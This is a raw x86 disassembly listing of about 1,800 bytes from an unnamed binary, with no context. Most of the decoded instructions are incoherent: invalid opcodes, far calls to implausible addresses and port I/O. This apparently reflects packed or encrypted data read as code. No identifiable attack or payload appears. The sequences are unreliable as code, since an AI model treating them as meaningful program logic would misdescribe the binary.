  408f8f:	xor    DWORD PTR ds:0x98312df6,ebx
  408f95:	fmul   QWORD PTR [edi]
  408f97:	pop    esi
  408f98:	sbb    eax,0x96ffab4d
  408f9d:	inc    esi
  408f9e:	mov    al,ds:0x9fb497e1
  408fa3:	pop    ecx
  408fa4:	add    BYTE PTR gs:0x20589791,dl
  408fab:	ins    BYTE PTR es:[edi],dx
  408fac:	add    BYTE PTR [eax],al
  408fae:	mov    esp,0x2583a5bd
  408fb3:	(bad)  
  408fb4:	das    
  408fb5:	(bad)  
  408fb6:	lods   al,BYTE PTR ds:[esi]
  408fb7:	mov    esi,0xe9870008
  408fbc:	dec    esp
  408fbd:	(bad)  
  408fbe:	out    0x32,eax
  408fc0:	and    eax,DWORD PTR [esp+ebp*2]
  408fc3:	outs   dx,DWORD PTR ds:[esi]
  408fc4:	xchg   ebp,eax
  408fc5:	push   eax
  408fc6:	xor    DWORD PTR [edx+0x4ae90009],0x32e9ff96
  408fd0:	xchg   esi,eax
  408fd1:	jne    0x408fc4
  408fd3:	call   0xc2c0:0x32e9c94f
  408fda:	in     eax,0x32
  408fdc:	cmp    al,0x8b
  408fde:	aad    0xb2
  408fe0:	int    0xac
  408fe2:	push   ss
  408fe3:	add    cl,dh
  408fe5:	inc    ebp
  408fe6:	test   DWORD PTR ds:0xe90009,esi
  408fec:	jecxz  0x408fa1
  408fee:	push   0xff96a2e9
  408ff3:	xchg   ecx,eax
  408ff4:	aas    
  408ff5:	mov    ch,0xff
  408ff7:	xchg   esi,eax
  408ff8:	lods   al,BYTE PTR ds:[esi]
  408ff9:	dec    esp
  408ffa:	rol    BYTE PTR [ecx],0x2d
  408ffd:	stc    
  408ffe:	(bad)  
  408fff:	call   0x7f1cb0de
  409004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409005:	add    BYTE PTR [ebp+0x31],0x4d
  409009:	or     DWORD PTR [eax],edx
  40900b:	jmp    0x459d3142
  409010:	into   
  409011:	xchg   esi,eax
  409012:	mov    DWORD PTR [esi+eax*1-0x3d2827c],esp
  409019:	aam    0xff
  40901b:	call   0x1006a52
  409020:	or     esp,DWORD PTR [ebx]
  409022:	mov    DWORD PTR [ebp+0xc],0x48ffffa9
  409029:	ja     0x4090a0
  40902b:	rcl    bh,0x3f
  40902e:	aam    0xff
  409030:	int    0x31
  409032:	pop    DWORD PTR [ebp+0x48]
  409035:	into   
  409036:	inc    ebp
  409037:	fadd   DWORD PTR [edi+0x6]
  40903a:	add    BYTE PTR [eax],al
  40903c:	dec    edi
  40903d:	inc    eax
  40903e:	hlt    
  40903f:	inc    DWORD PTR [edi]
  409041:	or     al,BYTE PTR [eax]
  409043:	(bad)  
  409044:	int    0xcd
  409046:	push   eax
  409047:	push   0x80000a08
  40904c:	mov    dl,0x9
  40904e:	push   DWORD PTR [ebp+0x0]
  409051:	loopne 0x4090b4
  409053:	push   0xffffffc8
  409055:	fmul   DWORD PTR [ecx]
  409057:	or     eax,eax
  409059:	jl     0x40906a
  40905b:	cmp    DWORD PTR [ebp-0x64],0x9
  40905f:	jne    0x409066
  409061:	loope  0x4090cb
  409063:	add    BYTE PTR [eax],al
  409065:	fmul   st,st(6)
  409067:	inc    ebp
  409068:	mov    al,0x87
  40906a:	push   es
  40906b:	add    BYTE PTR [eax],al
  40906d:	push   ebp
  40906e:	inc    ecx
  40906f:	mov    al,0x50
  409071:	xlat   BYTE PTR ds:[ebx]
  409072:	lock mov ebx,0x99868
  409078:	adc    BYTE PTR ds:0xb050c441,0x40
  40907f:	enter  0x9800,0x2
  409083:	shl    BYTE PTR [ebp-0x73],0x64
  409087:	fadd   DWORD PTR [eax]
  409089:	mov    BYTE PTR [ecx],cl
  40908b:	mov    eax,DWORD PTR [ebp+0x40]
  40908e:	int3   
  40908f:	add    BYTE PTR [eax],al
  409091:	in     eax,0xe8
  409093:	ret    
  409094:	mov    ecx,0xd44
  409099:	xor    ebx,esi
  40909b:	ret    
  40909c:	repz mov ebp,esi
  40909f:	inc    edi
  4090a0:	les    ecx,FWORD PTR ds:0x460003a0
  4090a6:	pop    esp
  4090a7:	pop    ebx
  4090a8:	(bad)  
  4090a9:	hlt    
  4090aa:	iret   
  4090ab:	lds    eax,FWORD PTR [ebp+0x59]
  4090ae:	out    0xd,al
  4090b0:	add    BYTE PTR [ecx],dh
  4090b2:	jecxz  0x4090fb
  4090b4:	hlt    
  4090b5:	add    BYTE PTR [esi],ah
  4090b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b8:	add    eax,DWORD PTR [eax]
  4090ba:	lods   al,BYTE PTR ds:[esi]
  4090bb:	gs (bad) 
  4090bd:	push   eax
  4090be:	mov    esp,DWORD PTR [edx+0x160e0029]
  4090c4:	pop    edi
  4090c5:	call   0x437cd2
  4090ca:	sub    ah,dl
  4090cc:	push   ss
  4090cd:	push   es
  4090ce:	mov    dl,0x25
  4090d0:	mov    bh,0x0
  4090d2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4090d4:	stos   BYTE PTR es:[edi],al
  4090d5:	mov    WORD PTR [ecx],?
  4090d7:	mov    ds:0x9264ff03,al
  4090dc:	pushf  
  4090dd:	jne    0x4090d0
  4090df:	ret    
  4090e0:	pop    ss
  4090e1:	mov    eax,0x414e0359
  4090e6:	xor    DWORD PTR [ebx+0x17],edx
  4090e9:	mov    esp,0xc524c9
  4090ee:	xor    DWORD PTR [edi],ebx
  4090f0:	enter  0x3e14,0x33
  4090f4:	inc    edi
  4090f5:	fadd   QWORD PTR [ecx]
  4090f7:	clc    
  4090f8:	add    edi,edi
  4090fa:	and    al,0x62
  4090fc:	lods   al,BYTE PTR ds:[esi]
  4090fd:	sti    
  4090fe:	cdq    
  4090ff:	sbb    DWORD PTR [ebp+0x195710b],0xffffffeb
  409106:	out    0x18,eax
  409108:	inc    edi
  409109:	mov    ah,0x7e
  40910b:	xchg   ebp,eax
  40910c:	push   edi
  40910d:	call   0xffddb5e2
  409112:	outs   dx,BYTE PTR ds:[esi]
  409113:	or     esp,ebx
  409115:	pop    edi
  409116:	pop    ecx
  409117:	cld    
  409118:	es add al,0x0
  40911b:	xor    DWORD PTR [ecx],edi
  40911d:	push   esi
  40911e:	pop    ss
  40911f:	xchg   ebp,eax
  409120:	xchg   esp,eax
  409121:	aam    0x57
  409123:	pop    ecx
  409124:	das    
  409125:	inc    eax
  409126:	popf   
  409127:	inc    esi
  409128:	add    BYTE PTR [ecx],ch
  40912a:	pop    ss
  40912b:	xor    esp,DWORD PTR [eax-0x74b7f08]
  409131:	call   0x9cd4d64d
  409136:	repz daa 
  409138:	push   ds
  409139:	in     eax,dx
  40913a:	pushf  
  40913b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40913c:	pop    ebp
  40913d:	add    DWORD PTR [eax+ebx*1-0x6c],eax
  409141:	push   cs
  409142:	or     ecx,esi
  409144:	sbb    eax,0x801ea8eb
  409149:	and    DWORD PTR [ecx],ecx
  40914b:	ficomp DWORD PTR [eax+ebx*8]
  40914e:	mov    gs,WORD PTR [ebp+eiz*2-0x67]
  409152:	pushf  
  409153:	fs std 
  409155:	in     eax,0x16
  409157:	popf   
  409158:	mov    al,ds:0x93de9900
  40915d:	bound  edi,QWORD PTR [ebx-0x546ae22a]
  409163:	xchg   edi,eax
  409164:	retf   
  409165:	jmp    0xa95e576d
  40916a:	stos   DWORD PTR es:[edi],eax
  40916b:	iret   
  40916c:	scas   al,BYTE PTR es:[edi]
  40916d:	mov    dh,0x9c
  40916f:	mov    dh,0x1d
  409171:	ins    DWORD PTR es:[edi],dx
  409172:	stos   DWORD PTR es:[edi],eax
  409173:	xchg   edi,eax
  409174:	scas   al,BYTE PTR es:[edi]
  409175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409176:	pushf  
  409177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409178:	sbb    eax,0xae7fab61
  40917d:	xchg   esi,eax
  40917e:	pushf  
  40917f:	add    BYTE PTR [edx+0x5033d15],dh
  409185:	add    DWORD PTR [esi-0x665f2aea],eax
  40918b:	mov    ecx,0x6200937e
  409190:	jno    0x4091c1
  409192:	pop    edi
  409193:	mov    al,ds:0xbbfff870
  409198:	mov    ecx,0xba2583a4
  40919d:	aaa    
  40919e:	sub    esi,DWORD PTR [edx]
  4091a0:	mov    cl,0x15
  4091a2:	or     al,0xe9
  4091a4:	es inc ebx
  4091a6:	add    esp,0x42
  4091a9:	xchg   ebx,eax
  4091aa:	jae    0x40915d
  4091ac:	scas   eax,DWORD PTR es:[edi]
  4091ad:	dec    ebp
  4091ae:	cld    
  4091af:	cdq    
  4091b0:	xchg   ebp,eax
  4091b1:	sbb    eax,0xcb91410c
  4091b6:	add    cl,ch
  4091b8:	scas   eax,DWORD PTR es:[edi]
  4091b9:	leave  
  4091ba:	js     0x409195
  4091bc:	mov    ebp,0x3d010c1c
  4091c1:	mov    bh,0xff
  4091c3:	push   cs
  4091c4:	mov    ebx,0x1f06f84c
  4091c9:	xchg   ebp,eax
  4091ca:	call   0x4a895c
  4091cf:	loop   0x4091c3
  4091d1:	sbb    eax,0xf944ee19
  4091d6:	(bad)  
  4091d7:	pop    esp
  4091d8:	lds    edi,FWORD PTR [ecx]
  4091da:	call   DWORD PTR [ebp+ebp*1-0x5f]
  4091de:	add    edx,edi
  4091e0:	mov    edx,0xb18b92
  4091e5:	stos   BYTE PTR es:[edi],al
  4091e6:	sbb    al,0xfc
  4091e8:	rol    DWORD PTR [eax],1
  4091ea:	int3   
  4091eb:	add    cl,ch
  4091ed:	fwait
  4091ee:	sbb    al,0xc
  4091f0:	rol    DWORD PTR [eax],0xbd
  4091f3:	jmp    FWORD PTR [esi-0x4fa43942]
  4091f9:	outs   dx,DWORD PTR ds:[esi]
  4091fa:	add    eax,0xa5ae3400
  4091ff:	sub    DWORD PTR [ebp-0x71006cc3],0x728cb8
  409209:	scas   al,BYTE PTR es:[edi]
  40920a:	outs   dx,BYTE PTR ds:[esi]
  40920b:	call   DWORD PTR [eax+0x20]
  40920e:	or     al,0x1
  409210:	add    BYTE PTR [eax+0x58c7185e],cl
  409216:	push   es
  409217:	leave  
  409218:	ret    
  409219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40921a:	sub    esp,0xffffff83
  40921d:	jge    0x40921d
  40921f:	push   DWORD PTR [ebx+0x5f]
  409222:	mov    edi,DWORD PTR [ebp+0x10]
  409225:	pop    eax
  409226:	add    bl,BYTE PTR [ecx]
  409228:	inc    DWORD PTR [ebp+0x4075fea2]
  40922e:	pop    esi
  40922f:	(bad)  
  409231:	jmp    FWORD PTR [ebp-0x1]
  409234:	jne    0x40923e
  409236:	outs   dx,DWORD PTR ds:[esi]
  409237:	jne    0x409245
  409239:	dec    edi
  40923a:	clc    
  40923b:	pop    es
  40923c:	call   0x3fe958
  409241:	push   ecx
  409242:	retf   
  409243:	adc    BYTE PTR [eax],al
  409245:	lds    eax,FWORD PTR [edx-0x52ff7c14]
  40924b:	std    
  40924c:	push   DWORD PTR [ebx-0x24]
  40924f:	mov    bh,BYTE PTR [ebp+0xc]
  409252:	or     BYTE PTR [edx],al
  409254:	push   ss
  409255:	jmp    DWORD PTR [ebp-0x6a]
  409258:	(bad)  
  409259:	jne    0x40923b
  40925b:	pop    ebp
  40925c:	mov    bl,0xd6
  40925e:	jmp    FWORD PTR [esi-0x1]
  409261:	jne    0x40922f
  409263:	outs   dx,BYTE PTR ds:[esi]
  409264:	jne    0x40926e
  409266:	lock add edx,edi
  409269:	(bad)  
  40926a:	out    dx,eax
  40926b:	(bad)
  40926f:	fmul   DWORD PTR [edx-0xfadb414]
  409275:	jmp    DWORD PTR [ebp+0x1]
  409278:	call   0xffaf01c2
  40927d:	mov    DWORD PTR [ebp+0x1],edx
  409280:	cmp    DWORD PTR [ebp+0x31],0xffffffac
  409284:	add    esi,DWORD PTR [edi+eiz*8-0x7e]
  409288:	adc    BYTE PTR [ecx+ebx*4],cl
  40928b:	sar    BYTE PTR [eax-0x3c698101],1
  409291:	je     0x409286
  409293:	sub    al,0x40
  409295:	lock add DWORD PTR [ebx],esp
  409298:	adc    BYTE PTR [ecx+ebx*2],cl
  40929b:	mov    bh,0xba
  40929d:	call   FWORD PTR [esi-0x6a]
  4092a0:	ret    
  4092a1:	je     0x4092c6
  4092a3:	and    DWORD PTR [eax],ebx
  4092a5:	cld    
  4092a6:	xor    DWORD PTR [eax-0x3c000d],esp
  4092ac:	call   0xf80f:0xd23d0075
  4092b3:	dec    ecx
  4092b4:	(bad)  
  4092b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b6:	jmp    FWORD PTR [esi]
  4092b8:	lods   al,BYTE PTR ds:[esi]
  4092b9:	ret    
  4092ba:	jne    0x4092fc
  4092bc:	out    0xf,eax
  4092be:	adc    BYTE PTR [esi],bl
  4092c0:	jbe    0x409259
  4092c2:	call   FWORD PTR [edx+edi*8+0xa397599]
  4092c9:	dec    edx
  4092ca:	inc    DWORD PTR [esi]
  4092cc:	or     BYTE PTR [eax-0x548cfebb],cl
  4092d2:	(bad)  
  4092d3:	(bad)  
  4092d4:	xchg   edi,eax
  4092d5:	cdq    
  4092d6:	jmp    DWORD PTR [esi+ebp*4-0x55]
  4092da:	xchg   BYTE PTR [eax],cl
  4092dc:	test   al,0x99
  4092de:	leave  
  4092df:	repz sahf 
  4092e1:	add    edx,DWORD PTR [ebp-0x56]
  4092e4:	mov    BYTE PTR [ebp+0xfbfc1c4],0xc
  4092eb:	fldcw  WORD PTR [esi-0x46]
  4092ee:	(bad)  
  4092ef:	mov    esi,0xb20c3f19
  4092f4:	aad    0x7
  4092f6:	add    BYTE PTR ds:0x357598e7,ah
  4092fc:	or     DWORD PTR [ecx-0x616f80bc],edx
  409302:	or     eax,0x86da1571
  409307:	hlt    
  409308:	cwde   
  409309:	cmp    DWORD PTR [ecx-0x6e6f0304],ebx
  40930f:	pop    edi
  409310:	nop
  409311:	jle    0x409320
  409313:	add    BYTE PTR [ecx+0x15],dh
  409316:	retf   0xec82
  409319:	mov    ecx,gs
  40931b:	add    eax,DWORD PTR [ecx+0x9]
  40931e:	(bad)  
  409320:	pop    edi
  409321:	push   ss
  409322:	stc    
  409323:	cwde   
  409324:	fmul   QWORD PTR [esi+edx*2-0x2b6fb6f1]
  40932b:	or     ebx,DWORD PTR [ecx-0x62]
  40932e:	inc    edi
  40932f:	cdq    
  409330:	ds jle 0x4092d7
  409333:	xchg   ebx,eax
  409334:	loope  0x4092d6
  409336:	int    0xb8
  409338:	cs nop
  40933a:	cs sysexit 
  40933d:	mov    eax,ds:0x901ebacd
  409342:	xor    dh,al
  409344:	and    eax,0x1d8cbc09
  409349:	mov    WORD PTR ds:0x21e46294,fs
  40934f:	cdq    
  409350:	test   BYTE PTR [ecx],al
  409352:	adc    DWORD PTR [ecx],ebp
  409354:	xlat   BYTE PTR ds:[ebx]
  409355:	(bad)  
  409356:	test   BYTE PTR [edx+0x176a0174],0x39
  40935d:	or     DWORD PTR [ebp+0x42],ebx
  409360:	ficom  WORD PTR ds:0xadfaabf1
  409366:	(bad)  
  409367:	cwde   
  409368:	cmp    cl,cl
  40936a:	push   ebp
  40936b:	(bad)  
  40936c:	mov    ch,0x45
  40936e:	mov    ecx,0xf115be33
  409373:	stos   DWORD PTR es:[edi],eax
  409374:	mov    ds:0xb600ae,eax
  409379:	leave  
  40937a:	add    eax,eax
  40937c:	xor    eax,0xa57d888f
  409381:	xor    cl,BYTE PTR [ecx]
  409383:	adc    cl,ch
  409385:	cmp    eax,0xa91cfef9
  40938a:	(bad)  
  40938b:	jne    0x40931e
  40938d:	(bad)  
  40938f:	loope  0x409317
  409391:	cdq    
  409392:	add    eax,eax
  409394:	cmc    
  409395:	xor    ecx,DWORD PTR [ebp+ecx*4+0x2c]
  409399:	lds    edi,FWORD PTR [eax]
  40939b:	call   0xffd03d89
  4093a0:	data16 das 
  4093a2:	add    eax,ebp
  4093a4:	sub    DWORD PTR [edx+0x7562ff8f],ebx
  4093aa:	xor    ecx,ecx
  4093ac:	sub    eax,DWORD PTR [esi-0x71]
  4093af:	push   esp
  4093b0:	jb     0x409348
  4093b2:	mov    esp,eax
  4093b4:	jne    0x40934e
  4093b6:	(bad)  
  4093b7:	jmp    FWORD PTR [esi]
  4093b9:	scas   eax,DWORD PTR es:[edi]
  4093ba:	push   ecx
  4093bb:	(bad)  
  4093bc:	cs leave 
  4093be:	or     DWORD PTR [eax],eax
  4093c0:	jmp    0xed8615f7
  4093c5:	and    eax,0xb2ec74c9
  4093ca:	sar    edi,1
  4093cc:	xchg   ebx,eax
  4093cd:	pop    es
  4093ce:	mov    ds:0x932e878,al
  4093d3:	push   DWORD PTR [esi+ebp*1-0x5f]
  4093d7:	fisttp QWORD PTR [edx]
  4093d9:	leave  
  4093da:	mov    cs,WORD PTR [ebx]
  4093dc:	sub    DWORD PTR [eax],eax
  4093de:	aaa    
  4093df:	(bad)  
  4093e0:	addr16 mov edi,0xde004876
  4093e6:	inc    eax
  4093e7:	std    
  4093e8:	out    0xf2,eax
  4093ea:	xchg   BYTE PTR [esi+0x2138c2ff],cl
  4093f0:	fild   DWORD PTR [eax]
  4093f2:	pop    es
  4093f3:	inc    esp
  4093f4:	add    bh,bh
  4093f6:	std    
  4093f7:	add    al,ch
  4093f9:	or     al,0xc4
  4093fb:	jbe    0x4093fc
  4093fd:	mov    DWORD PTR ds:0xd7fffe2d,ecx
  409403:	fnstsw WORD PTR ds:0x8d0a8801
  409409:	test   edx,ebx
  40940b:	ja     0x40940c
  40940d:	dec    DWORD PTR [eax+0x5d]
  409410:	test   al,bl
  409412:	mov    bh,0x76
  409414:	lea    eax,[ebp-0x8836]
  40941a:	dec    eax
  40941b:	jbe    0x4093d2
  40941d:	mov    eax,0xe8ff75d6
  409422:	mov    esi,0xe10000ca
  409427:	xchg   DWORD PTR [esi+edi*8+0xf4075e7],edi
  40942e:	int3   
  40942f:	xchg   edx,eax
  409430:	add    BYTE PTR [eax],al
  409432:	dec    eax
  409433:	adc    DWORD PTR [ebp-0x8a093e],0xff9a1af7
  40943d:	call   FWORD PTR [eax]
  40943f:	pop    es
  409440:	test   BYTE PTR [ebx+0xa0800],al
  409446:	(bad)  
  409447:	retf   0x4fa5
  40944a:	push   0x414649
  40944f:	xor    BYTE PTR [esi+0x30800c3],al
  409455:	shl    BYTE PTR [ebp+0xd],0x5d
  409459:	int3   
  40945a:	add    al,bl
  40945c:	or     DWORD PTR [ebp-0x88e56b],ecx
  409462:	jmp    DWORD PTR [ebp+0x48]
  409465:	sub    al,0x50
  409467:	sbb    BYTE PTR [edx+0x4f],0x41
  40946b:	xor    DWORD PTR [eax-0x600d8d55],esp
  409471:	add    ecx,DWORD PTR [ebx]
  409473:	icebp  
  409474:	int3   
  409475:	add    cl,ch
  409477:	xchg   BYTE PTR [edi-0x3351fffd],bl
  40947d:	pop    es
  40947e:	call   0xffd757eb
  409483:	sub    ah,BYTE PTR [eax+0x10]
  409486:	wbinvd 
  409488:	adc    cl,BYTE PTR [ebx+0x41]
  40948b:	xor    DWORD PTR [edi+0x10],esi
  40948e:	or     al,0x99
  409490:	idiv   BYTE PTR [edx+0x97a7eff]
  409496:	push   0x31
  409498:	movups xmm1,XMMWORD PTR [ecx+ebx*2]
  40949c:	or     bh,BYTE PTR [ebx+0x702c66ff]
  4094a2:	ret    0x265f
  4094a5:	xchg   esi,eax
  4094a6:	lea    eax,[eax]
  4094a8:	add    edi,esp
  4094aa:	xor    DWORD PTR [eax+0x59],edx
  4094ad:	xchg   BYTE PTR [edx-0x69b0b901],bh
  4094b3:	jne    0x4094ce
  4094b5:	inc    edi
  4094b6:	adc    BYTE PTR [esi+esi*1],dl
  4094b9:	push   esp
  4094ba:	repz dec edi
  4094bc:	cs dec esi
  4094be:	or     ebp,eax
  4094c0:	and    ebp,ebx
  4094c2:	xchg   ebp,eax
  4094c3:	dec    DWORD PTR [ecx]
  4094c5:	aas    
  4094c6:	scas   al,BYTE PTR es:[edi]
  4094c7:	call   DWORD PTR [esi]
  4094c9:	clc    
  4094ca:	and    cl,BYTE PTR [ebp-0x7a73398d]
  4094d0:	mov    ebp,0xb2ff95fc
  4094d5:	test   ebx,esi
  4094d7:	(bad)  
  4094d8:	jge    0x40947a
  4094da:	stos   BYTE PTR es:[edi],al
  4094db:	adc    ch,dh
  4094dd:	or     eax,0xd69cfef3
  4094e2:	xchg   esp,eax
  4094e3:	(bad)  
  4094e4:	fimul  WORD PTR [ecx]
  4094e6:	ror    DWORD PTR [ebp+0x8e909f2],1
  4094ec:	icebp  
  4094ed:	adc    eax,0x41a32c14
  4094f2:	sub    BYTE PTR [esi+edi*4],al
  4094f5:	push   ss
  4094f6:	cmc    
  4094f7:	stos   DWORD PTR es:[edi],eax
  4094f8:	and    BYTE PTR [eax+0x56ae95be],dh
  4094fe:	jge    0x409496
  409500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409501:	mov    WORD PTR [ecx],ds
  409503:	lods   al,BYTE PTR ds:[esi]
  409504:	clc    
  409505:	scas   eax,DWORD PTR es:[edi]
  409506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409507:	xchg   ebp,eax
  409508:	add    DWORD PTR [eax-0x71ff03e4],ecx
  40950e:	sbb    ch,ah
  409510:	xchg   esp,eax
  409511:	cld    
  409512:	hlt    
  409513:	cmp    BYTE PTR [ebp+0x2f860104],dl
  409519:	sbb    DWORD PTR [eax-0xb1b6b13],esp
  40951f:	sbb    BYTE PTR [ebp+0x308100dc],dl
  409525:	pop    esp
  409526:	mov    WORD PTR [esi-0x54],fs
  409529:	repz mov bl,0x5e
  40952c:	xchg   ebp,eax
  40952d:	mov    esp,0x46962b86
  409532:	mov    WORD PTR [ecx+0x474d8494],?
  409538:	xchg   ebp,eax
  409539:	mov    eax,ss:0x931c28f
  40953f:	ins    BYTE PTR es:[edi],dx
  409540:	les    esi,FWORD PTR [esi]
  409542:	xchg   BYTE PTR [eax],bh
  409544:	xchg   esi,eax
  409545:	push   ds
  409546:	mov    WORD PTR [esi],fs
  409548:	dec    edi
  409549:	aad    0x8a
  40954b:	push   ds
  40954c:	xchg   ebp,eax
  40954d:	sbb    DWORD PTR [edx+0x2b],ebp
  409550:	add    al,0x31
  409552:	mov    WORD PTR [esp+ebx*2-0x1],ss
  409556:	mov    eax,DWORD PTR [esi]
  409558:	lods   al,BYTE PTR ds:[esi]
  409559:	and    esi,DWORD PTR [esi+edi*8+0xc6f894]
  409560:	fnsave [edx]
  409562:	ss mov edi,ebp
  409565:	or     BYTE PTR [ecx],cl
  409567:	call   FWORD PTR [ecx+eiz*8-0x76]
  40956b:	jne    0x409566
  40956d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40956e:	adc    eax,0x3700d60c
  409573:	add    eax,ebp
  409575:	push   cs
  409576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409577:	mov    edi,edi
  409579:	mov    al,0xf0
  40957b:	clc    
  40957c:	call   DWORD PTR [ebx]
  40957e:	mov    eax,0x393cff9c
  409583:	mov    eax,ds:0x8bc59241
  409588:	or     ebp,DWORD PTR [ecx+0x14feeb26]
  40958e:	test   DWORD PTR [ebx],edi
  409590:	call   0xffcc5e3b
  409595:	cmp    DWORD PTR [ebp+edx*1-0xad879e8],esp
  40959c:	dec    edi
  40959d:	jle    0x4095de
  40959f:	add    eax,ebp
  4095a1:	aaa    
  4095a2:	mov    ebp,0x9d81ff8b
  4095a7:	mov    dl,0xff
  4095a9:	imul   ax,si,0x14
  4095ad:	jmp    0x572d15d1
  4095b2:	aaa    
  4095b3:	cmc    
  4095b4:	(bad)  
  4095b5:	aam    0x42
  4095b7:	mov    dh,BYTE PTR [ebp-0xb]
  4095ba:	or     bh,ch
  4095bc:	(bad)  
  4095bd:	mov    ah,0x3a
  4095bf:	mov    eax,ds:0x8abd36b9
  4095c4:	push   DWORD PTR [esi+ecx*1-0x42068a74]
  4095cb:	adc    al,0xc
  4095cd:	xchg   ebx,eax
  4095ce:	adc    DWORD PTR [ebp+esi*2-0x9c251f],ecx
  4095d5:	push   cs
  4095d6:	add    BYTE PTR [ebp-0x2bff8a76],ah
  4095dc:	jne    0x409653
  4095de:	adc    bh,ch
  4095e0:	cld    
  4095e1:	or     ebp,DWORD PTR [edx-0x4]
  4095e4:	jne    0x40965b
  4095e6:	or     BYTE PTR [eax],dh
  4095e8:	sbb    edi,edi
  4095ea:	dec    edi
  4095ec:	dec    esp
  4095ed:	ret    0xd810
  4095f0:	ror    DWORD PTR [edx-0xf3ea414],1
  4095f6:	push   ebx
  4095f7:	push   es
  4095f8:	into   
  4095f9:	sub    bl,bl
  4095fb:	inc    ebx
  4095fc:	inc    eax
  4095fd:	or     al,0xff
  4095ff:	test   al,0x87
  409601:	inc    ebp
  409602:	clc    
  409603:	fcomip st,st(0)
  409605:	pop    es
  409606:	(bad)  
  409607:	push   ebp
  409608:	jns    0x4095d1
  40960a:	inc    ebp
  40960b:	mov    ah,0x5
  40960d:	add    BYTE PTR [eax],al
  40960f:	cwde   
  409610:	cmp    DWORD PTR ds:0x445390,0x0
  409617:	and    al,0xd9
  409619:	cmp    BYTE PTR [ebp-0x80],0x6
  40961d:	je     0x409675
  40961f:	fnstsw WORD PTR [edi]
  409621:	lock push eax
  409623:	xor    al,BYTE PTR [edx+ebp*2]
  409626:	add    BYTE PTR [edx],dh
  409628:	add    eax,0x6587d83
  40962d:	je     0x409634
  40962f:	out    dx,eax
  409630:	out    dx,eax
  409631:	por    mm3,QWORD PTR [edx-0x14]
  409635:	jmp    FWORD PTR [ecx+0x48]
  409638:	mov    DWORD PTR [ebp-0x8],eax
  40963b:	add    BYTE PTR [eax-0x1c6fea89],bl
  409641:	inc    esp
  409642:	add    BYTE PTR [ebx],cl
  409644:	pop    eax
  409645:	icebp  
  409646:	cs or  ebp,0x71
  40964a:	add    BYTE PTR [ecx+eax*1+0xb],dh
  40964e:	inc    ebp
  40964f:	or     al,0x83
  409651:	dec    eax
  409652:	lock cmp esi,DWORD PTR [ecx]
  409655:	test   al,0x1a
  409657:	pop    ss
  409658:	jb     0x409656
  40965a:	jle    0x4096d1
  40965c:	std    
  40965d:	push   ss
  40965e:	adc    DWORD PTR [eax],ecx
  409660:	mov    edx,0x33e3935c
  409665:	(bad)  
  409666:	mov    esi,DWORD PTR [si-0x54]
  40966a:	xchg   edx,eax
  40966b:	jne    0x40964e
  40966d:	adc    al,BYTE PTR [ebx]
  40966f:	inc    DWORD PTR [esp+esi*4-0x65]
  409673:	out    0xf1,al
  409675:	lahf   
  409676:	add    ecx,DWORD PTR [ebx+0x5b31daf2]
  40967c:	call   0x64095de
  409681:	pop    ss
  409682:	lahf   
  409683:	sub    DWORD PTR [ebp+0x53],0x36
  409687:	push   esi
  409688:	push   es
  409689:	dec    eax
  40968a:	fisttp WORD PTR [edi-0x10]
  40968d:	lahf   
  40968e:	fwait
  40968f:	ins    BYTE PTR es:[edi],dx
  409690:	jo     0x409631
  409692:	add    ecx,DWORD PTR [ebx-0x3b7a597]
  409698:	xor    DWORD PTR [eax+0x602a0003],esp
  40969e:	pop    ss
  40969f:	ds add cl,bl
  4096a2:	mov    dl,0x33
  4096a4:	inc    ecx
  4096a5:	xor    edi,ebp
  4096a7:	fwait
  4096a8:	hlt    
  4096a9:	jno    0x40964a
  4096ab:	add    ecx,DWORD PTR [ebx]
  4096ad:	jno    0x40965a
  4096af:	loop   0x40963b
  4096b1:	inc    ecx
  4096b2:	mov    bh,0xcb
  4096b4:	dec    edi
  4096b5:	lock lahf 
  4096b7:	ss call 0x43760f
  4096bd:	sub    ah,al
  4096bf:	push   ss
  4096c0:	push   ds
  4096c1:	mov    edx,0x25457fca
  4096c6:	mov    ds:0x72f1ec9b,eax
  4096cb:	add    edx,DWORD PTR [eax+0x16]
  4096ce:	or     bh,BYTE PTR [esi]
  4096d0:	xchg   BYTE PTR [ebp+eax*4-0x3ec4e817],cl
  4096d7:	call   0xae49c7df
  4096dc:	xor    DWORD PTR [edx+0x52],ebx
  4096df:	sub    cl,BYTE PTR [ebx+0x31]
  4096e2:	or     ecx,ebp
  4096e4:	add    eax,DWORD PTR [esi-0xd436e19]
  4096ea:	fisub  WORD PTR [ecx-0x61]
  4096ed:	mov    dl,0x4d
  4096ef:	fld    DWORD PTR [ebp+0x4331d50c]
  4096f5:	xor    DWORD PTR [ecx],ecx
  4096f7:	pop    ebp
  4096f8:	div    BYTE PTR [ebx+0x703d3946]
  4096fe:	or     ecx,ebp
  409700:	pop    ss
  409701:	cmp    BYTE PTR [esp+edi*8-0x3605ffc9],cl
  409708:	call   0x7150bb10
  40970d:	add    esi,DWORD PTR [ecx]
  40970f:	or     ecx,ebp
  409711:	mov    edx,0x8e249672
  409716:	outs   dx,DWORD PTR ds:[esi]
  409717:	or     ecx,ebp
  409719:	leave  
  40971a:	icebp  
  40971b:	or     ecx,ebp
  40971d:	leave  
  40971e:	icebp  
  40971f:	or     ch,cl
  409721:	leave  
  409722:	icebp  
  409723:	or     ebp,ecx
  409725:	leave  
  409726:	icebp  
  409727:	or     al,0xe9
  409729:	leave  
  40972a:	icebp  
  40972b:	or     eax,0x7cec7ee4
  409730:	mov    ecx,0xe8f3311d
  409735:	sbb    eax,0x1de8f331
  40973a:	xor    ebx,esi
  40973c:	call   0xe94ba85c
  409741:	add    ebx,DWORD PTR [ebx-0x4bfa2cd7]
  409747:	int    0xff
  409749:	xor    ah,BYTE PTR [ebp-0x78]
  40974c:	adc    eax,0xffca559d
  409751:	icebp  
  409752:	repnz std 
  409754:	add    DWORD PTR [eax],esi
